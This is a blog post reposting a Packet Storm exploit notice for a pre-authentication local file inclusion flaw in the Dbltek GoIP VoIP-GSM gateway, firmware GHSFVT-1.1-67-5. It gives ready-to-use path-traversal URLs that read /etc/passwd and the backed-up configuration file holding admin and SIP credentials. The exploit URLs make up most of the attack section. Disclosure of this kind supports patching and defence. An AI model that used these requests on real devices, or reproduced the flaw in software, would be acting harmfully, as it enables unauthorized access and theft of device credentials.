---
layout: post
title: Dbltek GoIP GHSFVT-1.1-67-5
date: 2022-02-21 03:32 +0300
categories: [Exploits, File Inclusion]
tags: [exploits]
---








![](../../../assets/img/Exploits/dbitek.png)

The Dbltek GoIP, which is running firmware version GHSFVT-1.1-67-5, has a vulnerability related to local file inclusion.

  

```
MD5 | 1da824e80cedd24b390e4caee1202eb9
```

```perl
    # Exploit Title: Dbltek GoIP - Local File Inclusion
    # Date: 20.02.2022
    # Exploit Author: Valtteri Lehtinen & Lassi Korhonen
    # Vendor Homepage: http://en.dbltek.com/index.html
    # Software Link: -
    # Version: GHSFVT-1.1-67-5 (firmware version)
    # Tested on: Target is an IoT device
    
    # Exploit summary
    Dbltek GoIP-1 is a VoIP-GSM gateway device, which allows making calls and sending SMS messages using SIP.
    The device has a webserver that contains two pre-auth Local File Inclusion vulnerabilities.
    
    Using these, it is possible to download the device configuration file containing all device credentials (including admin panel credentials and SIP credentials) if the configuration file has been backed up.
    
    It is probable that also other models and versions of Dbltek GoIP devices are affected.
    
    Writeup: https://shufflingbytes.com/posts/hacking-goip-gsm-gateway/
    
    # Proof of Concept
    Assuming the device is available on IP 192.168.9.1.
    
    Download /etc/passwd
    http://192.168.9.1/default/en_US/frame.html?content=3D..%2f..%2f..%2f ..%2f..%2fetc%2fpasswd
    http://192.168.9.1/default/en_US/frame.A100.html?sidebar=3D..%2f..%2f ..%2f..%2f..%2fetc%2fpasswd
    
    Download device configuration file from /tmp/config.dat (requires that the configuration file has been backed up)
    http://192.168.9.1/default/en_US/frame.html?content=3D..%2f..%2f..%2f..%2f..%2ftmp%2fconfig.dat
    http://192.168.9.1/default/en_US/frame.A100.html?sidebar=3D..%2f..%2f..%2f..%2f..%2ftmp%2fconfig.dat
```
{: .nolineno }
    
<br>
  

>*Source* :   [https://packetstormsecurity.com](https://packetstormsecurity.com)
